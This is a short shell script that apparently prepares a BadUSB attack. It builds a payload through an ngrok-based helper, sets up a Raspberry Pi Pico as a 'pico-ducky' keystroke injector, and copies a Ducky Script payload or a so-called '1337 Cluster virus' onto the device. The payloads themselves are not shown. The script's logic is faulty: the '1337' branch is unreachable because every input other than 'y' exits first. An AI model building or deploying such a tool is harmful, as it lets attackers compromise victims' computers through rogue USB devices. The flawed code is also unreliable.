#!/bin/sh
userr="vakandi"
folder_rasp="/media/$userr/CIRCUITPY"


bash script/check_dependencies.sh


sh script/createpayload-automaticngrok.sh
echo "\033[45m   Do you want to upload the payload and prepare the Raspberry Pico now?\033[0m"
echo "Type 'y' for yes, Enter for exiting"
echo "Type '1337' for a special 1337 Cluster virus"
read choice
if [ "$choice" = "y" ]
then
	sh pico-ducky/setup_auto.sh
	cp utiles/payload.dd $folder_rasp/
else
	echo "Exiting..."
	exit
fi

if [ "$choice" = "1337" ]
then
	sh pico-ducky/setup_auto.sh
	cp utiles/payload_cluster.dd $folder_rasp/
else
	echo "Exiting..."
	exit
fi
